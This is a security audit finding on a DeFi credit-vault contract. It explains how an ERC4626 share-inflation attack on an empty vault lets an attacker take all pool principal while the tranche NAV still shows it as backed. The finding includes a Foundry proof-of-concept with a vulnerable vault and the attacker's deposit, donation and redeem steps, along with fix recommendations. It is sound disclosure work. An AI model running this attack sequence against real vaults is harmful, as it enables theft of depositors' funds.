### Title
ERC4626 share inflation drains programmable borrower principal and leaves unbacked tranche NAV - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` deposits all epoch liquidity into an externally configured ERC4626 vault and ignores the returned share amount. An unprivileged user of a vulnerable vault can perform a first-depositor/share-inflation attack before the first `startEpoch`, causing the borrower contract to receive zero shares while the attacker redeems the pool principal. In minted-interest mode, `stopEpoch` does not pull principal or reduce tranche NAV for this vault loss, so the credit vault remains marked solvent even though its assets were stolen.

### Finding Description
`ProgrammableBorrower.initialize` and `setVault` accept any ERC4626 vault whose reported `asset()` matches the CDO underlying, then grant it unlimited underlying allowance. [1](#0-0) [2](#0-1) 

During `startEpoch`, `IdleCDOEpochVariant` transfers the pool balance to the configured borrower and invokes `onStartEpoch`. [3](#0-2)  `onStartEpoch` deposits the entire underlying balance through `_depositToVault`, but `_depositToVault` ignores the `vault.deposit` return value and has no minimum-share or post-deposit valuation check. [4](#0-3) [5](#0-4) 

For an empty ERC4626 without inflation protection:

1. The attacker deposits `1` underlying unit and receives `1` vault share.
2. The attacker donates at least the expected pool principal to the vault.
3. The CDO starts the epoch; the borrower contract deposits the pool principal and mints zero shares due to the inflated share price.
4. The attacker redeems their one share for the donation plus the pool deposit.

The accounting then records the missing vault position as a vault loss. `_vaultNetInterest` compares zero current vault assets plus withdrawals against `epochStartVaultAssets`, and `totalInterestDueNow` floors the resulting negative value at zero. [6](#0-5) 

Critically, programmable-borrower operation requires `isInterestMinted`, so `_amountToPullFromBorrower` is zero absent pending withdrawals and the CDO simply mints strategy tokens for interest rather than verifying that principal remains backed. [7](#0-6) [8](#0-7)  A zero-share deposit therefore leaves the CDO's full strategy-token NAV intact while the external vault position is empty. The loss is only discovered later when a withdrawal request requires cash and the borrower's `transferFrom` fails. [9](#0-8) 

This is the credit-vault analogue of executing functionality supplied by an untrusted control sphere: the trusted CDO lifecycle delegates asset custody and share minting semantics to an externally shared vault, but does not validate that the vault returned economically meaningful shares.

### Impact Explanation
An unprivileged vault depositor can steal effectively all pool principal deposited into a vulnerable vault. The attacker's cost is the donation needed to make the borrower contract's share mint round to zero; the attacker redeems that donation plus the victim deposit.

For example, with a `10,000,000` unit pool deposit and a naive proportional ERC4626:

- Attacker cost: `10,000,001` units.
- Victim deposit received by vault: `10,000,000` units.
- Attacker redemption: `20,000,001` units.
- Net attacker profit: `10,000,000` units.
- Credit-vault NAV remains `10,000,000` units despite having no vault shares or underlying.

This causes direct theft and protocol insolvency. Future withdrawal requests become permanently undercollateralized and eventually force a borrower default.

### Likelihood Explanation
The attack requires the owner or manager to configure a vulnerable ERC4626 vault, such as an empty vault with no dead-share seed, virtual-share protection, or minimum-share enforcement. Neither the vault nor its ordinary users are modeled as trusted roles, and the prompt explicitly permits an unprivileged user of the programmable borrower's ERC4626 vault as the attacker.

No privileged malicious action is needed. The attacker only calls the vault's normal deposit, transfer, and redeem functions before the first epoch starts. Existing protections do not stop it because:

- `setVault` checks only `asset()` compatibility.
- `_depositToVault` does not enforce `shares > 0` or minimum expected shares.
- `totalInterestDueNow` floors the vault loss at zero instead of triggering an immediate default.
- Minted-interest mode requires no principal recall during a normal `stopEpoch`.

### Recommendation
- Enforce a minimum expected-share bound when depositing into the ERC4626 vault, based on `previewDeposit` and an allowed slippage/rounding tolerance.
- Revert `onStartEpoch` and prevent epoch activation when the vault position after deposit is materially below the pre-deposit principal.
- Use a permissioned vault registry or require a fixed, audited vault for each deployment rather than arbitrary ERC4626 compatibility.
- Seed protected vaults with dead shares or require an existing minimum total supply before use.
- Track principal loss separately from `totalInterestDueNow`; a vault PnL loss below the principal baseline should enter CDO loss accounting or default handling instead of merely clamping epoch interest to zero.

### Proof of Concept
The following Foundry test can be added to `test/foundry/ProgrammableBorrowerCreditVault.t.sol`. It forks mainnet for the real USDC token and uses a standard proportional ERC4626 implementation without share-inflation protection.

```solidity
contract InflationVault is ERC20 {
  IERC20Detailed public immutable assetToken;

  constructor(address asset_) ERC20("Inflation Vault", "ivUSDC") {
    assetToken = IERC20Detailed(asset_);
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0 ? shares : shares * assetToken.balanceOf(address(this)) / supply;
  }

  function maxWithdraw(address owner_) external view returns (uint256) {
    return convertToAssets(balanceOf(owner_));
  }

  function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    uint256 assetsBefore = assetToken.balanceOf(address(this));
    uint256 supply = totalSupply();
    shares = supply == 0 || assetsBefore == 0 ? assets : assets * supply / assetsBefore;
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function withdraw(uint256 assets, address receiver, address owner_) external returns (uint256 shares) {
    uint256 supply = totalSupply();
    uint256 managedAssets = assetToken.balanceOf(address(this));
    shares = assets * supply / managedAssets;
    if (shares * managedAssets < assets * supply) shares += 1;
    _burn(owner_, shares);
    assetToken.transfer(receiver, assets);
  }

  function redeem(uint256 shares, address receiver, address owner_) external returns (uint256 assets) {
    assets = convertToAssets(shares);
    _burn(owner_, shares);
    assetToken.transfer(receiver, assets);
  }
}
```

```solidity
function testVaultShareInflationDrainsProgrammableBorrowerPrincipal() external {
  uint256 poolAmount = 10_000 * oneScale;
  address attacker = makeAddr("vaultUserAttacker");
  InflationVault inflationVault = new InflationVault(USDC);

  // Recreate the production programmable-borrower setup with an uninflated vault.
  _setUpProgrammableBorrowerCreditVault(FORK_BLOCK, address(inflationVault));

  // Inflate the empty vault: one share claims the donation plus the next deposit.
  deal(USDC, attacker, 2 * poolAmount + 1, true);
  vm.startPrank(attacker);
  underlying.approve(address(inflationVault), type(uint256).max);
  inflationVault.deposit(1, attacker);
  underlying.transfer(address(inflationVault), poolAmount);
  vm.stopPrank();

  // Victim deposits and manager starts the epoch. ProgrammableBorrower deposits all
  // pool principal but receives zero vault shares.
  vm.prank(owner);
  cdoEpoch.setIsInterestMinted(true);
  idleCDO.depositAA(poolAmount);
  vm.prank(manager);
  cdoEpoch.startEpoch();

  assertEq(inflationVault.balanceOf(address(programmableBorrower)), 0);
  assertEq(underlying.balanceOf(address(programmableBorrower)), 0);
  assertEq(programmableBorrower.vaultLoss(), poolAmount);
  assertEq(programmableBorrower.totalInterestDueNow(), 0);

  // The attacker redeems their one share for their donation plus the pool principal.
  vm.prank(attacker);
  uint256 stolen = inflationVault.redeem(1, attacker, attacker);
  assertEq(stolen, 2 * poolAmount + 1);

  // Normal stop succeeds because minted-interest mode pulls no cash. The pool still
  // reports the pre-attack NAV even though the programmable borrower holds nothing.
  vm.warp(cdoEpoch.epochEndDate() + 1);
  vm.prank(manager);
  cdoEpoch.stopEpoch(0, 0);

  assertFalse(cdoEpoch.defaulted());
  assertApproxEqAbs(cdoEpoch.virtualPrice(address(aaTranche)), oneScale, 1);

  // A withdrawal exposes the missing principal. On the following stop, the borrower
  // has no assets to transfer and the pool defaults.
  cdoEpoch.requestWithdraw(0, address(aaTranche));
  vm.warp(cdoEpoch.epochEndDate() + cdoEpoch.bufferPeriod() + 1);
  vm.prank(manager);
  cdoEpoch.startEpoch();

  vm.warp(cdoEpoch.epochEndDate() + 1);
  vm.prank(manager);
  cdoEpoch.stopEpoch(0, 0);

  assertTrue(cdoEpoch.defaulted());
}
```

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L118-134)
```text
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

    __Ownable_init();
    __ReentrancyGuard_init();
    transferOwnership(_owner);

    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
    idleCDO = _idleCDO;
    manager = _manager;
    borrower = _borrower;
    borrowerApr = _borrowerApr;

    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L158-168)
```text
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L214-222)
```text
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L330-346)
```text
  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
  }

  /// @notice Compute the net vault delta split into interest and loss (mutually exclusive).
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-384)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/IdleCDOEpochVariant.sol (L280-297)
```text
    uint256 totUnderlyings = _contractTokenBalance(token);
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
    _strategy.collectInstantWithdrawFunds(pendingInstant > totUnderlyings ? totUnderlyings : pendingInstant);

    // if there are more requests than the current underlyings we simply send all underlyings
    // to the IdleCreditVault contract
    if (pendingInstant > totUnderlyings) {
      // if borrower is programmable, notify epoch start even if no funds were sent
      _startEpochProgrammableBorrower(_pendingWithdraws);
      return;
    }
    // allow instant withdraws right away without waiting for the deadline
    allowInstantWithdraw = true;
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
```

**File:** contracts/IdleCDOEpochVariant.sol (L373-379)
```text
    uint256 _grossInterest = _isRequestingAllFunds ? _expectedInterest - _totBorrowed : _expectedInterest;
    bool _mintInterest = isInterestMinted && !_isRequestingAllFunds;
    // In minted mode IdleCDO only needs cash for withdraw requests, not for epoch interest itself.
    uint256 _amountToPullFromBorrower = _mintInterest ? 0 : _expectedInterest;
    if (_mintInterest && _interest > 1) {
      uint256 _maxApr = _strategy.maxApr();
      _checkNotAllowed(_maxApr != 0 && _grossInterest > _calcInterestWithApr(getContractValue(), _maxApr) + _pendingWithdrawFees);
```

**File:** contracts/IdleCDOEpochVariant.sol (L395-409)
```text
    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
```

**File:** contracts/IdleCDOEpochVariant.sol (L428-436)
```text
      if (_mintInterest) {
        // if interest is not transferred we mint strategy tokens equal to the full epoch interest
        if (_grossInterest != 0) _strategy.mintStrategyTokens(_grossInterest);
        // and increase unclaimedFees by pending withdraw fees before _updateAccounting
        unclaimedFees += _pendingWithdrawFees;
      }

      // update tranche prices and unclaimed fees
      _updateAccounting();
```
